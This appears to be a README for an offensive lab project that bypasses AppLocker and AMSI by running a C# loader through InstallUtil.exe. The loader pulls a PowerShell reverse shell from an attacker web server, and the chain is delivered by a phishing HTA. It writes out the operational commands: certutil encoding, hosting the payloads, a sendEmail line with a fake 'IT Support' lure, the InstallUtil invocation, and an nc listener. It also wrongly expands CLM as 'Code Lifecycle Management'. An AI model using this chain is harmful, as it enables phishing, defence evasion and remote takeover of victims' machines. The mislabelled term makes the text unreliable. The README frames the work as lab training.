# 🧠 OSEP CLM Bypass Project – PowerShell Runspace Loader (AppLocker Evasion)

This project demonstrates a stealthy AV/EDR evasion and **AppLocker bypass technique** by abusing `InstallUtil.exe` (a Microsoft LOLBin) and executing PowerShell payloads via .NET Runspaces. It was developed as part of an OSEP lab exercise to simulate a realistic phishing attack in an environment hardened against traditional payloads.

The core of this technique leverages the **CLM (Code Lifecycle Management) bypass**, which uses a C# executable with a custom `Uninstall()` method and a `[RunInstaller(true)]` attribute. This allows us to execute arbitrary code without ever touching `powershell.exe`, effectively **bypassing AppLocker and application whitelisting policies**.

---

## 🔧 Overview

The payload is a compiled C# executable (`bypassrunner.exe`) that:

- Uses `System.Management.Automation.dll` to load and execute PowerShell scripts in memory via Runspaces
- Executes its logic inside the `Uninstall()` method to abuse `InstallUtil.exe /U` behavior
- Avoids calling `powershell.exe` directly, increasing stealth and bypassing AppLocker
- Downloads and executes:
  - `amsi.txt`: a PowerShell AMSI bypass
  - `shell.ps1`: a reverse shell PowerShell payload

The entire execution chain is triggered from a `.hta` phishing file.

---

## 📁 Files and Execution Chain

1. **bypassrunner.exe**  
   The compiled C# executable with PowerShell runspace-based execution inside `Uninstall()`.

2. **payload.txt**  
   A base64-encoded version of the executable, created using:
   ```
   certutil -encode bypassrunner.exe payload.txt
   ```

3. **amsi.txt**  
   Contains an AMSI bypass to disable AMSI inspection at runtime.

4. **shell.ps1**  
   A PowerShell reverse shell script that connects back to the attacker's listener.

5. **pishing.hta**  
   An HTML Application file that:
   - Downloads `payload.txt`
   - Decodes it to `runner.exe`
   - Executes it using `InstallUtil.exe /U`

---

## 🛠 Compilation

The project is compiled using **Visual Studio**. To do so:

1. Create a new **Console Application (.NET Framework)** project.
2. Add references to:
   - `System.Configuration.Install`
   - `System.Management.Automation` from:
     ```
     C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
     ```
3. Replace `Program.cs` content with the payload code.
4. Build the project to produce `bypassrunner.exe`.

---

## 🚀 Execution Flow

1. Start a web server in the attacker machine:
   ```
   python3 -m http.server 80
   ```

2. Host the following files:
   - `payload.txt` (encoded binary)
   - `amsi.txt` (AMSI bypass)
   - `shell.ps1` (reverse shell)
   - `phishing.hta` (delivery vector)

3. Send the phishing email to the victim with the following command:
   ```
   sendEmail -s 192.168.1.160 -target@target.com -f attacker@attacker.com -u "Urgent: Please review this issue" -m "Hi Victim, We’ve detected an issue affecting mail delivery. Please review the report as soon as possible: http://192.168.1.130/phishing.hta Let us know if you have any trouble accessing it. Thanks, IT Support"
   ```

4. When executed, the `.hta`:
   - Downloads `payload.txt`
   - Decodes it with `certutil` to `runner.exe`
   - Executes it using:
     ```
     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\runner.exe
     ```

5. The EXE runs the PowerShell payload using Runspaces:
   - Loads and executes `amsi.txt`
   - Loads and executes `shell.ps1` in memory

6. The attacker receives a reverse shell connection on port 443:
   ```
   rlwrap -cAr nc -lvnp 443
   ```

---

## 📌 Key Features

- Bypasses AppLocker using the CLM technique via `InstallUtil.exe`
- Fileless PowerShell execution using Runspaces
- Avoids traditional signatures and blocked binaries like `powershell.exe`
- Leverages trusted Microsoft LOLBins (`InstallUtil.exe`, `certutil.exe`)
- Suitable for environments with application whitelisting and antivirus protections

---

## ⚠ Disclaimer

This project is for **educational and authorized penetration testing only**. Do not use this method on systems for which you do not have explicit permission. Misuse may violate laws and result in consequences.
